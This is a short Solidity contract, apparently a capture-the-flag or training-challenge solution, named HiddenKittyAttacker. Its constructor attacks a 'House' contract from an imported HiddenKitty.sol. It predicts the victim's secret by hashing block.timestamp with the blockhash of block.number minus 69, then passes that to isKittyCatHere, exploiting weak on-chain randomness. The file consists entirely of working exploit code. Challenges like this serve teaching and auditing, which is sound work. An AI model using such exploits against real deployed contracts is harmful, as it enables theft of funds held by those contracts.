// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../HiddenKitty.sol";

contract HiddenKittyAttacker {
    constructor(address _victimAddress) {
        House target = House(_victimAddress);
        target.isKittyCatHere(
            keccak256(
                abi.encodePacked(block.timestamp, blockhash(block.number - 69))
            )
        );
    }
}
